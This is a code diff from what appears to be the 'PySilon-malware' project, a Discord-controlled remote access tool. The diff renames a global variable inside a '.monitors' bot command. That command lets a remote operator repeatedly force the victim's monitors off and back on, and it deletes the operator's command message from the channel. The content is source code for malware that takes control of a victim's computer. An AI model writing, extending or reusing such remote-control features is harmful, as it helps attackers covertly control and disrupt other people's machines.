@@ -1,15 +1,18 @@
 import monitorcontrol
 import threading
 
+global monitors_off
+monitors_off = False
+
 @client.command(name="monitors")
 async def monitor_control(ctx, state=None):
-    global turned_off
+    global monitors_off
     await ctx.message.delete()
     if state == "off":
-        if not turned_off:
-            turned_off = True
+        if not monitors_off:
+            monitors_off = True
             def monitor_off():
-                while turned_off:
+                while monitors_off:
                     for monitor in monitorcontrol.get_monitors():
                         with monitor:
                             monitor.set_power_mode(4)
@@ -26,7 +29,7 @@ async def monitor_control(ctx, state=None):
             await ctx.send(embed=embed)
 
     elif state == "on":
-        if turned_off:
+        if monitors_off:
             for monitor in monitorcontrol.get_monitors():
                 with monitor:
                     monitor.set_power_mode(1)
@@ -34,7 +37,7 @@ async def monitor_control(ctx, state=None):
             embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
-            turned_off = False
+            monitors_off = False
         else: 
             embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
